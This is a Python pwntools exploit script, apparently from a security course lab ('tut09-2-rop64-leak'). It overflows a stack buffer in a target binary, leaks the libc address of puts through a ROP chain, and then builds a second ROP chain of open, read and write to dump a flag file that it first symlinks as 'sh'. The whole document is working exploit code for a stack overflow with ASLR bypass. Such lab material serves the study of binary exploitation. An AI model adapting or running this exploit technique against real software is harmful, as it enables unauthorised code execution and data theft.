import os
from pwn import *

try:
    os.symlink("/proc/flag", "sh")
except:
    pass

TARGET = "/home/lab09/tut09-2-rop64-leak/target"
elf = ELF(TARGET)
LIBC = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
add_gbuf = elf.symbols["gbuf"]

addr_pop_rdi = 0x0000000000401303
addr_pop_rsi_r15 = 0x0000000000401305
addr_pop_rdx = 0x0000000000401309

addr_vuln = elf.symbols["vuln"]
         
offset = 264 # offset 구하는 방법 공부
payload = b"A" * offset
        
# put_plt(puts_got)
payload += p64(addr_pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

# vuln()
payload += p64(addr_vuln)

    
# [ret_vuln] <- pop rdi; ret
# [puts_got] <- arg1 of func1
# [puts_plt] <- addr of func1

########################################
p = process([TARGET])

p.recvuntil(b"password: ")
p.sendline(payload)

p.recvuntil(b"Wrong! :(\n")
out = p.recvline().strip()
addr_puts = u64(out.ljust(8, b"\x00"))
print(hex(addr_puts))

libc_base = addr_puts - LIBC.symbols["puts"]
print(hex(libc_base))

addr_open = libc_base + LIBC.symbols["open"]
addr_read = libc_base + LIBC.symbols["read"]
addr_write = libc_base + LIBC.symbols["write"]

addr_bin_sh = libc_base + list(LIBC.search(b"/bin/sh"))[0]
addr_sh = addr_bin_sh + 5
print(hex(addr_sh))
# /bin/sh

# open("sh", O_RDONLY)
payload2 = b"A" * offset
payload2 += p64(addr_pop_rdi)
payload2 += p64(addr_sh)
payload2 += p64(addr_pop_rsi_r15)
payload2 += p64(0)
payload2 += p64(0xdeadbeef)
payload2 += p64(addr_open)

# read(3, addr_buf, 1040)
payload2 += p64(addr_pop_rdi)
payload2 += p64(3)
payload2 += p64(addr_pop_rsi_r15)
payload2 += p64(add_gbuf)
payload2 += p64(0xdeadbeef)
payload2 += p64(addr_pop_rdx)
payload2 += p64(1040)
payload2 += p64(addr_read)

# write(stdout, addr_buf, 1040)
payload2 += p64(addr_pop_rdi)
payload2 += p64(1) # stdout
payload2 += p64(addr_pop_rsi_r15)
payload2 += p64(add_gbuf)
payload2 += p64(0xdeadbeef)
payload2 += p64(addr_pop_rdx)
payload2 += p64(1040)
payload2 += p64(addr_write)

payload2 += p64(0xcafebabe)

p.recvuntil(b"password: ")
p.sendline(payload2)

p.interactive()